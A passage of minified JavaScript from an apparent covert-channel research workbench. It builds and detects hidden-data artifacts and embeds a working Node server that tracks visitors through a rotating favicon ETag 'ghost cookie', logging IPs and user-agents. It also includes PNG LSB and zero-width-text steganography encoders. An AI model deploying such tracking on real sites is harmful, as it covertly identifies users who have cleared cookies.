png"});if(["text/binary","html","xml"].includes(r)||c.toLowerCase().endsWith(".txt")){const m=new TextDecoder().decode(l),v=gS(m);v.count>8?(o.push({id:"zero-width",name:"zero-width (txt)",status:"flag",note:`${v.count} zero-width codepoints`+(v.payload?" · payload recovered":"")}),v.payload&&(g=v.payload,d="stego-carrier — zero-width text",f=5)):o.push({id:"zero-width",name:"zero-width (txt)",status:"clean",note:`${v.count} zw codepoints`})}else o.push({id:"zero-width",name:"zero-width (txt)",status:"na",note:"not text"});if(r==="png"){let m=-1;e:for(let b=0;b+8<=l.length;b++)if(l[b]===0&&l[b+1]===0&&l[b+2]===0&&l[b+3]===0&&l[b+4]===73&&l[b+5]===69&&l[b+6]===78&&l[b+7]===68){m=b+8;break e}const v=m>=0?l.length-(m+4):0;v>0?(o.push({id:"trailing",name:"trailing-data",status:"flag",note:`${v} bytes after IEND`}),d==="clean"&&(d="trailing data after IEND",f=3)):o.push({id:"trailing",name:"trailing-data",status:"clean",note:"no tail"})}else if(r==="ico"){let m=6;try{const b=new DataView(l.buffer,l.byteOffset,l.byteLength),w=b.getUint16(4,!0);for(let T=0;T<w;T++){const U=b.getUint32(14+T*16,!0),G=b.getUint32(18+T*16,!0);m=Math.max(m,G+U)}}catch{m=l.length}const v=l.length-m;o.push({id:"trailing",name:"trailing-data",status:v>0?"flag":"clean",note:v>0?`${v} bytes beyond last frame`:"no tail"}),v>0&&d==="clean"&&(d="trailing data beyond ico frames",f=3)}else o.push({id:"trailing",name:"trailing-data",status:"na",note:`n/a for ${r}`});for(const m of bS.slice(5,8)){const v=m.id==="zip-walk"&&r==="zip"||m.id==="woff2-tables"&&r==="woff2"||m.id==="svg-scripts"&&r==="svg";o.push({id:m.id,name:m.name,status:"na",note:v?"armed":"not armed for this format"})}o.push({id:"exif",name:"exif",status:"na",note:"not armed for this format"}),o.push({id:"id3",name:"id3",status:"na",note:"not armed for this format"}),o.push({id:"pdf-actions",name:"pdf-actions",status:"na",note:"not armed for this format"});const _=yS(l);return o.push({id:"entropy",name:"entropy",status:"clean",note:`${_.toFixed(3)} bits/byte`}),{report:{file:c,size:l.length,magic:r,detectors:o,verdict:d,confidence:g?Math.max(f,4):f,lsb:y,extracted:g,at:new Date().toISOString()}}}const bf={reg:"BSC-001",write:'server rotates a 3-bit state into the ETag on /favicon.ico ("a1f3-<state>b"); 304 on If-None-Match match',persist:["hard refresh","tab close","restart"],vary:["user-agent","ip","etag"],observe:["same-origin fetch (If-None-Match)","cache-timing delta on 304 (~18 µs oracle)"],capacity:"3 b per rotation × N rotations; 48×48 alpha plane adds 2304 b LSB capacity"},xS=`// favicon_rebel.js — BSC-001 ETag ghost cookie server
// emitted by: mnf generate BSC-001   ·   REF: Favicon - Counter / Blueprint.txt
const http   = require("http");
const fs     = require("fs");
const path   = require("path");

const PORT = process.env.PORT || 8790;
let STATE  = process.env.MFY_STATE || "000";        // 3-bit ghost state
const ICO  = fs.readFileSync(path.join(__dirname, "favicon.ico"));
const hits = [];

http.createServer((req, res) => {
  if (req.url === "/favicon.ico") {
    const etag = '"a1f3-" + STATE + "b"';
    res.setHeader("ETag", etag);
    res.setHeader("Cache-Control", "no-store");
    if (req.headers["if-none-match"] === etag) return res.writeHead(304).end();
    hits.push({ t: Date.now(), ua: req.headers["user-agent"], ip: req.socket.remoteAddress });
    res.writeHead(200, { "Content-Type": "image/x-icon" });
    return res.end(Buffer.from(ICO));
  }
  if (req.url.startsWith("/state")) {                // write side (fleet / operator)
    const bits = (req.url.split("state=")[1] || "").slice(0, 3);
    if (/^[01]{3}$/.test(bits)) STATE = bits;
    res.setHeader("Content-Type", "application/json");
    return res.end(JSON.stringify({ state: STATE }));
  }
  if (req.url === "/hits") {
    res.setHeader("Content-Type", "application/json");
    return res.end(JSON.stringify(hits.slice(-100)));
  }
  if (req.url.startsWith("/dashboard")) {
    res.setHeader("Content-Type", "text/html");
    return fs.createReadStream(path.join(__dirname, "dashboard", "index.html")).pipe(res);
  }
  res.writeHead(404).end("ghost");
}).listen(PORT, () => console.log("ghost-01 on :" + PORT + " state=" + STATE));
`,SS=`<!doctype html>
<html><head><meta charset="utf-8"><title>ghost-01 · dashboard</title>
<style>
 body{background:#101517;color:#e9e6d8;font:12px ui-monospace,monospace;padding:24px}
 h1{font-size:14px;letter-spacing:2px;color:#d93628}
 .row{display:flex;gap:24px;margin:16px 0}
 .k{color:#78868a;font-size:10px}.v{font-size:18px}
 table{border-collapse:collapse;width:100%;font-size:11px}
 td,th{border-bottom:1px solid #22302f;padding:4px 8px;text-align:left;color:#c4cdc5}
</style></head><body>
<h1>◈ GHOST-01 · BSC-001 ETag GHOST</h1>
<div class="row"><div><div class="k">STATE</div><div class="v" id="st">—</div></div>
<div><div class="k">HITS</div><div class="v" id="hn">0</div></div>
<div><div class="k">LAST ETag</div><div class="v" id="et">—</div></div></div>
<table><tr><th>t</th><th>ip</th><th>user-agent</th></tr><tbody id="tb"></tbody></table>
<script>
async function poll(){
  const h = await (await fetch("/hits")).json();
  const s = await (await fetch("/state")).json();
  document.getElementById("hn").textContent = h.length;
  document.getElementById("st").textContent = s.state;
  document.getElementById("et").textContent = '"a1f3-' + s.state + 'b"';
  document.getElementById("tb").innerHTML = h.slice(-8).reverse().map(x =>
    "<tr><td>" + new Date(x.t).toISOString().slice(11,19) + "</td><td>" + x.ip + "</td><td>" +
    (x.ua||"").slice(0,60) + "</td></tr>").join("");
}
setInterval(poll, 1500); poll();
<\/script></body></html>`,TS=`# TLS in front of the ghost (prod / fly.io)
:443 {
  tls internal
  reverse_proxy 127.0.0.1:8790
}
`;function wS(){const l=o1(),c=u1(l,"BSC-001 · ETag ghost · 47 b state"),r=c1(l),o=JSON.stringify({artifact:"BSC-001",name:"favicon.ico — ETag ghost cookie",zone:"16",capacity:{shannon:3+c,measured:3},persist:bf.persist,spec:bf},null,2),d=new TextEncoder;return[{path:"server.js",data:d.encode(xS),lang:"js"},{path:"favicon.ico",data:r,lang:"bin"},{path:"dashboard/index.html",data:d.encode(SS),lang:"html"},{path:"Caddyfile",data:d.encode(TS),lang:"conf"},{path:"card.json",data:d.encode(o),lang:"json"}]}const ES={ghost:["node server.js"],static:["open dashboard/index.html  # preview only — the channel needs the ghost"],docker:["docker build -t mfy/bsc-001-ghost .","docker run -d -p 8790:8790 mfy/bsc-001-ghost"]},Pg={reg:"STG-001",write:"LSB of the red channel across all pixels; MF47 sync header + UTF-8 payload; ECC optional",persist:["any (the file is the state)"],vary:["none — identical bytes everywhere"],observe:["red-plane bit dump → sync scan + chi-square last-bit"],capacity:"96×96 RGBA = 9216 b at depth 1; measured occupancy = payload length"},AS=`// extractor.js — reads back exactly what generate() wrote (trinity rule: you can
// read everything you write). Same codec as the web ANALYZE modal and mnf analyze.
//   import { extractPngPayload } from "@mfy/codec";
//   const payload = extractPngPayload(fs.readFileSync("report.png"));
console.log("extractor for STG-001 — see @mfy/codec#extractPngPayload");
`,ng="STG-001 · red-plane LSB · round-trip verified";function jS(){const l=uS(ng),c=cS(l),r=JSON.stringify({artifact:"STG-001",name:"report.png — red-plane LSB",zone:"07",capacity:{shannon:9216,measured:ng.length*8+32},spec:Pg},null,2),o=new TextEncoder;return[{path:"report.png",data:c,lang:"bin"},{path:"extractor.js",data:o.encode(AS),lang:"js"},{path:"card.json",data:o.encode(r),lang:"json"}]}const NS={static:["open report.png"],ghost:[`node -e "require('http').createServer((q,r)=>r.end('served')).listen(8791)"  # serve dir`],docker:["docker build -t mfy/stg-001 .","docker run -d -p 8791:80 mfy/stg-001"]},$g={reg:"TXT-001",write:"each payload byte = 8 zero-width chars (U+200B bit 0 / U+200C bit 1) between cover chars",persist:["any (text is state)","survives copy/paste in most apps"],vary:["none — identical codepoints everywhere"],observe:"strip U+200B–U+200F, regroup 8:1, decode UTF-8",capacity:"8 b per cover char; cover text length is the ceiling"},lg=`The quarterly report is attached. Key figures are unchanged from the
prior period; variance remains within the agreed band. Please confirm
receipt so we can close the working file. The field notes follow in
the appendix, with cross-references to the source assemblies.`,ig="TXT-001 · zero-width · round-trip verified";function CS(){const l=hS(lg,ig),c=`// extract.js — strip zero-width, regroup, decode.
// Same codec as the web ANALYZE modal and mnf analyze (trinity).
//   import { zwDecode } from "@mfy/codec";
console.log("extractor for TXT-001 — see @mfy/codec#zwDecode");
`,r=JSON.stringify({artifact:"TXT-001",name:"document.txt — zero-width",zone:"11",capacity:{shannon:lg.length*8,measured:ig.length*8+32},spec:$g},null,2),o=new TextEncoder;return[{path:"document.txt",data:o.encode(l),lang:"txt"},{path:"extract.js",data:o.encode(c),lang:"js"},{path:"card.json",data:o.encode(r),lang:"json"}]}const zS={static:["cat document.txt  # looks clean; mnf analyze document.txt reads it back"],ghost:[`node -e "console.log('static artifact — no ghost')"`],docker:["docker build -t mfy/txt-001 .","docker run --rm mfy/txt-001 cat document.txt"]},nc=cg.map(l=>({...l,status:l.status??"stub"})),OS=new Map(nc.map(l=>[l.reg,l]));new Map(nc.map(l=>[l.id,l]));const RS=new Set(["BSC-001","STG-001","TXT-001"]);nc.forEach(l=>{RS.has(l.reg)&&(l.status="live")});const DS={"BSC-001":bf,"STG-001":Pg,"TXT-001":$g};function US(l){const c=new TextEncoder,r=[];return(function o(d,f){for(const g of d){const y=f?`${f}/${g.n}`:g.n;if(g.t==="dir"||g.ch){g.ch&&o(g.ch,y);continue}if(g.l==="bin"){const _=new Uint8Array(64);_.set([77,70,89,32],0),r.push({path:y,data:_,lang:"bin"})}else{const _=g.id&&um[g.id]?um[g.id]:`// ${l.reg} · ${g.n}
// stub artifact — sources from corpus project ${l.proj}
// the codec for this carrier is not wired yet (see docs/ADDING-AN-ARTIFACT.md)
`;r.push({path:y,data:c.encode(_),lang:g.l??"txt"})}}})(l.files,""),r}function MS(l,c="ghost"){const r=OS.get(l);if(!r)throw new Error(`unknown artifact: ${l}`);const o=DS[l]??null;let d,f;if(l==="BSC-001")d=wS(),f=ES;else if(l==="STG-001")d=jS(),f=NS;else if(l==="TXT-001")d=CS(),f=zS;else{d=US(r);const y=d.find(_=>_.lang==="js")??d[0];f={static:[y.lang==="js"?`node ${y.path}`:`# open ${y.path}`],ghost:["# ghost server not wired for this artifact yet"],docker:["# dockerfile not emitted for this artifact yet"]}}const g={reg:l,name:r.name,runAs:c,files:d.map(y=>({path:y.path,size:y.data.length,lang:y.lang})),shell:f[c]??f.static,at:new Date().toISOString()};return{meta:r,spec:o,files:d,bundle:g,shell:f}}function HS(l,c){return _S(l,c).report}function BS(l){return l.extracted&&l.magic==="ico"||l.magic==="ico"?"BSC-001":l.magic==="png"?"STG-001":l.magic==="text/binary"||l.magic==="html"||l.magic==="xml"?"TXT-001":null}async function kS(){return(await fetch("/api/artifacts")).json()}async function LS(){return(await fetch("/api/evidence")).json()}async function GS(l){const c=performance.now(),r=await fetch("/ghost/favicon.ico",{cache:"no-store",headers:l?{"If-None-Match":l}:{}}),o=Math.round((performance.now()-c)*1e3),d=r.headers.get("etag"),f=d==null?void 0:d.match(/"a1f3-([01]{3})b"/);return{status:r.status,etag:d,bits:(f==null?void 0:f[1])??null,micros:o,at:Date.now()}}function qS(l){const[c,r]=ge.useState(new Date);ge.useEffect(()=>{const d=setInterval(()=>r(new Date),1e3);return()=>clearInterval(d)},[]);const o=c.toISOString().slice(11,19);return p.jsxs("div",{className:"topbar",children:[p.jsxs("div",{className:"wordmark",children:[p.jsx("span",{className:"seal",children:"M"}),"MANUFACTORY ",p.jsx("small",{children:"· ASSEMBLY 0.2 · BENCH"})]}),p.jsx("div",{className:"crumb",children:l.showEv?p.jsxs(p.Fragment,{children:[p.jsx("span",{className:"evchip",children:"EVIDENCE"}),p.jsx("span",{children:"live hit feed + SHA-256 chain"}),p.jsx("button",{className:"help",style:{border:"1px solid var(--teal-2)",background:"none",color:"#8fd0c8",borderRadius:3,fontSize:8,padding:"1px 6px"},onClick:l.onEvidence,children:"CLOSE (ESC)"})]}):l.art?p.jsxs(p.Fragment,{children:[p.jsx("span",{className:"reg",children:l.art.reg}),p.jsx("b",{children:l.art.name}),p.jsxs("span",{children:["· ",l.art.sub]}),l.dirty&&p.jsx("span",{className:"mod",children:"· MODIFIED"}),p.jsxs("span",{style:{opacity:.55},children:["zone ",l.art.zone]})]}):p.jsx("span",{children:"select an artifact · 91 in registry"})}),p.jsxs("div",{className:"utc",children:[o," UTC ",p.jsx("span",{className:"blink"})]})]})}function YS(l){return p.jsxs("div",{className:"footer",children:[p.jsx("button",{className:"help",onClick:l.onHelp,children:"[ HELP ? ]"}),p.jsxs("span",{className:"ctx",children:[l.art?`${l.art.cat} / ${l.art.reg}`:"CATALOG"," · mode ",l.mode.toUpperCase()]}),p.jsx("span",{className:"ctx",children:l.file??"no file"}),l.dirty>0&&p.jsxs("span",{className:"ctx",style:{color:"var(--amber)"},children:[l.dirty," file(s) modified"]}),p.jsxs("span",{className:"agg",children:[l.n," ARTIFACTS · ",l.live," LIVE · trinity: web · api · mnf → @mfy/artifacts"]})]})}function ZS(){return p.jsx("div",{className:"scanline"})}function XS({toasts:l}){return p.jsx("div",{className:"toasts",children:l.map(c=>p.jsx("div",{className:`toast ${c.kind==="red"?"red":""}`,children:c.msg},c.id))})}function VS(l,c=48){const r=[],o=Math.min(l.length,c*16);for(let d=0;d<o;d+=16){let f="",g="";for(let y=0;y<16&&d+y<o;y++){const _=l[d+y];f+=_.toString(16).padStart(2,"0")+" ",g+=_>=32&&_<127?String.fromCharCode(_):"."}r.push({off:d.toString(16).padStart(8,"0"),hex:f.padEnd(48),p:g})}return l.length>o&&r.push({off:"…",hex:`+${(l.length-o).toString()} more bytes`,p:""}),r}function QS(l){const c=new Array(256).fill(0);for(const d of l)c[d]++;let r=0;for(const d of c)d&&(r-=d/l.length*Math.log2(d/l.length));const o=Math.max(...c);return{bars:c,max:o,shannon:r}}function KS(l){if(l.length<8||l[0]!==137)return null;const c=[];let r=8;for(;r+8<=l.length&&c.length<40;){const o=l[r]<<24|l[r+1]<<16|l[r+2]<<8|l[r+3],d=String.fromCharCode(l[r+4],l[r+5],l[r+6],l[r+7]);if(c.push({off:r,type:d,len:o}),r+=12+o,!/^[A-Za-z]{4}$/.test(d))break}return c}function IS(l){let c;try{c=Ws(l)}catch{return null}return!c||!c.length?null:c.map(r=>({w:r.w,h:r.h,bits:32,bytes:r.bgrx.length+r.andMask.length,alpha:!0}))}function FS(l){const c=(l.match(/[\u200B\u200C\u200D\u2060]/g)??[]).length,r=l.split(`
`).length,o=(l.match(/\u200B/g)??[]).length,d=(l.match(/\u200C/g)??[]).length;return{chars:l.length,lines:r,zw:c,zwsp:o,zwnc:d}}function $s(l,c,r){const o=document.createElement("a");o.href=URL.createObjectURL(new Blob([c],{type:r})),o.download=l,o.click(),setTimeout(()=>URL.revokeObjectURL(o.href),4e3)}function JS({arts:l,sel:c,onPick:r}){const[o,d]=ge.useState(""),f=ge.useMemo(()=>{const g=new Map;for(const y of l)o&&!`${y.reg} ${y.name} ${y.sub} ${y.cat}`.toLowerCase().includes(o.toLowerCase())||(g.has(y.cat)||g.set(y.cat,[]),g.get(y.cat).push(y));return[...g.entries()]},[l,o]);return p.jsxs("div",{className:"panel rail",children:[p.jsxs("div",{className:"band",children:["CATALOG ",p.jsxs("span",{className:"sp",children:[l.length," ARTIFACTS · ",l.filter(g=>g.status==="live").length," LIVE"]})]}),p.jsx("input",{className:"filter",placeholder:"filter reg / name / mech…  (⌘K)",value:o,onChange:g=>d(g.target.value)}),p.jsx("div",{className:"rail-list",children:f.map(([g,y])=>p.jsxs("div",{children:[p.jsxs("div",{className:"cat-head",children:[p.jsx("span",{className:"sig",children:"◆"}),g,p.jsx("span",{style:{marginLeft:"auto"},children:y.length})]}),y.map(_=>p.jsxs("button",{className:`art-row ${_.reg===c?"on":""}`,onClick:()=>r(_.reg),children:[p.jsx("span",{className:"reg",children:_.reg}),p.jsx("span",{className:"nm",children:_.name}),p.jsx("span",{className:`led ${_.status==="live"?"live":""}`})]},_.reg))]},g))}),p.jsxs("div",{className:"rail-foot",children:[p.jsx("span",{children:"j/k · ⏎ navigate"}),p.jsx("span",{children:"green = real codec"})]})]})}function PS(l){var y,_;const{art:c,bundle:r,mode:o,file:d}=l,f=m=>{const v=r==null?void 0:r.files.find(b=>b.path===m);return v?v.data:null},g=d??((y=r==null?void 0:r.files.find(m=>m.lang!=="json"))==null?void 0:y.path)??((_=r==null?void 0:r.files[0])==null?void 0:_.path)??null;return p.jsxs("div",{className:"panel pv",children:[p.jsxs("div",{className:"band teal",children:["PREVIEW ",p.jsxs("span",{className:"sp",children:["V = cycle · ",o.toUpperCase()]})]}),p.jsx("div",{className:`pv-body ${o!=="rendered"?"mode-teal":""}`,children:c?p.jsx(WS,{art:c,bundle:r,mode:o,selected:g,bytes:f,onToast:l.onToast}):p.jsx("div",{className:"metacard",children:"no artifact selected — pick one from the catalog rail."})})]})}function rg({art:l}){return p.jsxs("div",{className:"metacard",children:[p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"ARTIFACT"}),p.jsxs("span",{className:"big",children:[l.reg," · ",l.name]})]}),p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"SUBTITLE"}),p.jsx("span",{children:l.sub})]}),p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"CARRIER"}),p.jsxs("span",{children:[l.cat," · zone ",l.zone]})]}),p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"VECTOR"}),p.jsx("span",{children:l.vector})]}),p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"PERSIST"}),p.jsx("span",{children:l.persist})]}),p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"CAPACITY"}),p.jsx("span",{children:l.cap})]}),p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"MECHANISM"}),p.jsx("span",{children:l.mech})]}),l.status==="stub"&&p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"STATE"}),p.jsx("span",{style:{color:"var(--amber)"},children:"stub — sources wired from corpus; codec not yet live (see ADDING-AN-ARTIFACT.md)"})]})]})}function sg({buf:l}){return p.jsx("div",{className:"hex",children:VS(l).map((c,r)=>p.jsxs("div",{children:[p.jsx("span",{className:"off",children:c.off}),"  ",c.hex," ",p.jsx("span",{className:"p",children:c.p})]},r))})}function $S(){const[l,c]=ge.useState(null),[r,o]=ge.useState(0),d=ge.useRef(void 0);return ge.useEffect(()=>{let f=!0;const g=()=>{GS(d.current).then(_=>{f&&(d.current=_.etag??void 0,c(_),o(m=>m+1))})};g();const y=setInterval(g,2500);return()=>{f=!1,clearInterval(y)}},[]),p.jsxs("div",{className:"probe",children:[p.jsxs("div",{children:[p.jsx("span",{className:"k",children:"PROBES"}),p.jsxs("span",{className:"g",children:[r," same-origin fetches · If-None-Match dance"]})]}),p.jsxs("div",{children:[p.jsx("span",{className:"k",children:"STATUS"}),l?p.jsx("span",{className:l.status===304?"g":"a",children:l.status===304?"304 (oracle — 18 µs delta)":"200 (fresh state)"}):"…"]}),p.jsxs("div",{children:[p.jsx("span",{className:"k",children:"ETag"}),p.jsx("span",{className:"r",children:(l==null?void 0:l.etag)??"…"})]}),p.jsxs("div",{children:[p.jsx("span",{className:"k",children:"GHOST STATE"}),p.jsxs("span",{className:"a",children:[(l==null?void 0:l.bits)??"…",".",(l==null?void 0:l.bits)==="000"?"000 — initial":"flipped"]})]}),p.jsxs("div",{children:[p.jsx("span",{className:"k",children:"RTT"}),p.jsxs("span",{children:[(l==null?void 0:l.micros)??"…"," µs"]})]}),p.jsxs("div",{children:[p.jsx("span",{className:"k",children:"CHANNEL"}),p.jsx("span",{children:"3 b per rotation · state survives hard refresh + restart"})]})]})}function WS(l){const{art:c,bundle:r,mode:o,selected:d}=l;if(o==="source"){const f=d?l.bytes(d):null;return f?f[0]===137||f[0]===0||f[0]===80?p.jsx(sg,{buf:f}):p.jsx("pre",{className:"minicode",style:{maxHeight:"100%",whiteSpace:"pre-wrap"},children:new TextDecoder().decode(f)}):p.jsx("div",{className:"metacard",children:"no file selected."})}if(o==="hex"){const f=d?l.bytes(d):null;return f?p.jsx(sg,{buf:f}):p.jsx("div",{className:"metacard",children:"no file."})}if(o==="structure"){const f=d?l.bytes(d):null;if(!f)return p.jsx("div",{className:"metacard",children:"no file."});if(Ws(f))return p.jsxs("table",{className:"stab",children:[p.jsxs("tr",{children:[p.jsx("th",{children:"frame"}),p.jsx("th",{children:"size"}),p.jsx("th",{children:"bits"}),p.jsx("th",{children:"bytes"}),p.jsx("th",{children:"alpha"})]}),IS(f).map((_,m)=>p.jsxs("tr",{children:[p.jsx("td",{children:m}),p.jsxs("td",{children:[_.w,"×",_.h]}),p.jsx("td",{children:_.bits}),p.jsx("td",{children:_.bytes}),p.jsx("td",{children:_.alpha?"yes — LSB plane":"no"})]},m))]});const y=KS(f);if(y)return p.jsxs("table",{className:"stab",children:[p.jsxs("tr",{children:[p.jsx("th",{children:"offset"}),p.jsx("th",{children:"type"}),p.jsx("th",{children:"length"})]}),y.map(_=>p.jsxs("tr",{children:[p.jsxs("td",{children:["0x",_.off.toString(16)]}),p.jsx("td",{style:{color:_.type==="IHDR"||_.type==="IEND"?"var(--amber)":"#c4cdc5"},children:_.type}),p.jsx("td",{children:_.len})]},_.off))]});if(f[0]!==137&&f[0]!==0&&f[0]!==80){const _=FS(new TextDecoder().decode(f));return p.jsxs("table",{className:"stab",children:[p.jsxs("tr",{children:[p.jsx("th",{children:"field"}),p.jsx("th",{children:"value"})]}),p.jsxs("tr",{children:[p.jsx("td",{children:"chars"}),p.jsx("td",{children:_.chars})]}),p.jsxs("tr",{children:[p.jsx("td",{children:"lines"}),p.jsx("td",{children:_.lines})]}),p.jsxs("tr",{children:[p.jsx("td",{children:"zero-width (U+200B/C/D/AD)"}),p.jsxs("td",{style:{color:_.zw?"var(--signal)":"#c4cdc5"},children:[_.zw,"  ",_.zw?"← TXT-001 signature":""]})]})]})}return p.jsxs("div",{className:"metacard",children:["no container walker for this format yet — ",p.jsx("b",{children:d})," · ",f.length," bytes."]})}if(o==="entropy"){const f=d?l.bytes(d):null;if(!f)return p.jsx("div",{className:"metacard",children:"no file."});const g=QS(f),y=new Set(g.bars.map((_,m)=>[_,m]).sort((_,m)=>m[0]-_[0]).slice(0,4).map(_=>_[1]));return p.jsxs("div",{children:[p.jsx("div",{className:"metacard",style:{marginBottom:6},children:p.jsxs("div",{className:"row",children:[p.jsx("span",{className:"k",children:"SHANNON"}),p.jsxs("span",{className:"big",style:{color:g.shannon>4?"var(--amber)":void 0},children:[g.shannon.toFixed(3)," bits/byte"]}),p.jsxs("span",{style:{color:"#78868a"},children:["(",f.length," bytes)"]})]})}),p.jsx("div",{className:"entropybars",children:g.bars.map((_,m)=>p.jsx("i",{className:y.has(m)?"hot":"",style:{height:`${_/g.max*100}%`},title:`0x${m.toString(16).padStart(2,"0")}: ${_}`},m))})]})}if(c.preview==="ico"){const f=r==null?void 0:r.files.find(y=>y.path==="favicon.ico"),g=f?`data:image/x-icon;base64,${of(f.data)}`:null;return p.jsxs("div",{children:[p.jsxs("div",{className:"mbt",children:[p.jsxs("div",{className:"tabs",children:[p.jsxs("div",{className:"tab",children:[p.jsx("span",{className:"f16"}),"ghost-01 · favicon.ico ",p.jsx("span",{style:{opacity:.5},children:"×"})]}),p.jsx("span",{style:{fontSize:8,color:"#5f6d6a"},children:"chrome mock"})]}),p.jsx("div",{className:"url",children:"http://localhost:8787/ghost/favicon.ico"}),p.jsxs("div",{className:"stage",children:[g&&[16,32,48].map(y=>p.jsxs("div",{className:"sizebox",children:[p.jsx("img",{src:g,style:{width:y,height:y,imageRendering:"pixelated"},alt:String(y)}),p.jsxs("span",{className:"lbl",children:[y,"px"]})]},y)),p.jsxs("div",{style:{fontSize:9,color:"#78868a",lineHeight:1.8},children:["ico frames: 3 × 32bpp",p.jsx("br",{}),"48×48 alpha plane = 2304 b",p.jsx("br",{}),"LSB capacity (shannon)",p.jsx("br",{}),p.jsx("b",{style:{color:"var(--amber)"},children:c.status==="live"?"payload embedded":"carrier only"})]})]})]}),c.status==="live"&&p.jsx($S,{})]})}if(c.preview==="code"){const f=r==null?void 0:r.files.find(y=>y.lang==="js"||y.lang==="ts"||y.lang==="py"),g=f&&f.lang!=="bin"?new TextDecoder().decode(f.data).split(`
`).slice(0,26).join(`
`):"—";return p.jsxs("pre",{className:"minicode",children:[g,f&&new TextDecoder().decode(f.data).split(`
`).length>26?`
…`:""]})}if(c.preview==="headers")return p.jsx("div",{className:"minicode",style:{whiteSpace:"pre-wrap"},children:`HTTP/1.1 200 OK
Server: ghost-01/${c.reg}
ETag: "a1f3-000b"
Cache-Control: no-store
${c.mech}

# carrier headers per spec — live rotation for BSC-001,
# others render here once their ghost is wired.`});if(c.preview==="text"){const f=r==null?void 0:r.files.find(g=>g.lang==="txt");return f?p.jsx("pre",{className:"minicode",style:{whiteSpace:"pre-wrap",color:"#e9e6d8"},children:new TextDecoder().decode(f.data)}):p.jsx(rg,{art:c})}return p.jsx(rg,{art:c})}function e2({bundle:l,file:c,setFile:r,dirty:o}){var m,v;const[d,f]=ge.useState({}),g=(l==null?void 0:l.meta.files)??[],y=c??((m=l==null?void 0:l.files.find(b=>b.lang!=="json"))==null?void 0:m.path)??((v=l==null?void 0:l.files[0])==null?void 0:v.path)??null,_=(b,w,T)=>b.map(U=>{var V;const G=T?`${T}/${U.n}`:U.n;if(U.ch){const ee=d[G]!==!1;return p.jsxs("div",{children:[p.jsxs("div",{className:"tnode",style:{paddingLeft:w*12+4},onClick:()=>f(W=>({...W,[G]:!ee})),children:[p.jsx("span",{className:"tw",children:ee?"▾":"▸"}),p.jsxs("span",{style:{color:"#78868a"},children:[U.n,"/"]}),p.jsxs("span",{className:"ln",children:[U.ch.length,"f"]})]}),ee&&_(U.ch,w+1,G)]},G)}const q=U.l==="bin";return p.jsxs("div",{className:`tnode ${G===y?"sel":""}`,style:{paddingLeft:w*12+18},onClick:()=>r(G),children:[p.jsx("span",{className:"dot",style:{background:q?"var(--amber)":void 0,boxShadow:q?"0 0 5px rgba(217,164,65,.6)":void 0}}),U.n,o[G]!==void 0&&p.jsx("span",{className:"dot dirty",title:"modified"}),p.jsxs("span",{className:"ln",children:[((V=l==null?void 0:l.files.find(ee=>ee.path===G))==null?void 0:V.data.length)??0," b"]})]},G)});return p.jsxs("div",{className:"panel tr",children:[p.jsxs("div",{className:"band",children:["FILE TREE ",p.jsxs("span",{className:"sp",children:[(l==null?void 0:l.files.length)??0," FILES · 5-FILE RULE"]})]}),p.jsxs("div",{className:"tree-body",children:[l?_(g,0,""):"—",p.jsx("div",{className:"tnote",children:"click a file → editor (right) · amber dot = binary · red dot = modified"})]})]})}function t2(l){var b,w;const{bundle:c,file:r,dirty:o,setDirty:d}=l,f=r??((b=c==null?void 0:c.files.find(T=>T.lang!=="json"))==null?void 0:b.path)??((w=c==null?void 0:c.files[0])==null?void 0:w.path)??null,g=c==null?void 0:c.files.find(T=>T.path===f),y=(g==null?void 0:g.lang)==="bin",_=f&&!y?o[f]??(g?new TextDecoder().decode(g.data):""):"",m=_.split(`
`);ge.useRef(null);const v=ge.useRef(null);return p.jsxs("div",{className:"panel",style:{flex:1},children:[p.jsxs("div",{className:"ed-head",children:[p.jsx("span",{className:"fname",children:f??"—"}),g&&p.jsx("span",{className:"lang",children:g.lang}),g&&p.jsxs("span",{style:{fontSize:8.5,color:"#9db3af"},children:[g.data.length," b · zone ",c==null?void 0:c.meta.zone]}),f&&o[f]!==void 0&&p.jsx("span",{className:"mod",children:"MODIFIED"})]}),g?y?p.jsxs("div",{className:"ed-empty",style:{flexDirection:"column",gap:8},children:[p.jsx("span",{style:{fontSize:22,color:"var(--amber)"},children:"▦"}),p.jsx("span",{children:"BINARY CARRIER — view in HEX / STRUCTURE / ENTROPY (V)"}),p.jsx("span",{style:{fontSize:8.5},children:"codec output is deterministic; bytes are canonical"})]}):p.jsxs("div",{className:"ed-wrap",children:[p.jsx("div",{className:"lns",ref:v,children:m.map((T,U)=>p.jsx("div",{children:U+1},U))}),p.jsxs("div",{className:"ed-area",children:[p.jsx("pre",{"aria-hidden":!0,children:_}),p.jsx("textarea",{spellCheck:!1,value:_,onChange:T=>d({...o,[f]:T.target.value}),onScroll:T=>{v.current&&(v.current.scrollTop=T.target.scrollTop),scrollRef.current&&(scrollRef.current.scrollTop=T.target.scrollTop)}})]})]}):p.jsx("div",{className:"ed-empty",children:"NO FILE"})]})}function a2(){const[l,c]=ge.useState([]);return ge.useEffect(()=>{let r=!0;const o=()=>LS().then(f=>r&&c(f.evidence));o();const d=setInterval(o,2e3);return()=>{r=!1,clearInterval(d)}},[]),p.jsxs("div",{className:"panel",style:{minHeight:0},children:[p.jsxs("div",{className:"band",children:["EVIDENCE ",p.jsxs("span",{className:"sp",children:[l.length," RECORDS · CHAIN HEAD ",l[0]?l[0].hash.slice(0,10):"GENESIS"]})]}),p.jsxs("div",{className:"evfeed",children:[l.length===0&&p.jsxs("div",{style:{fontSize:10,color:"#78868a",lineHeight:2,padding:8},children:["no records yet — probe the ghost: select ",p.jsx("b",{style:{color:"var(--signal)"},children:"BSC-001"}),", watch the preview, or curl ",p.jsx("b",{children:"/ghost/favicon.ico"}),". every 200 appends a chained record."]}),l.map((r,o)=>{var d,f;return p.jsxs("div",{className:"evblock",style:{height:40+Math.min(40,(((d=r.payload)==null?void 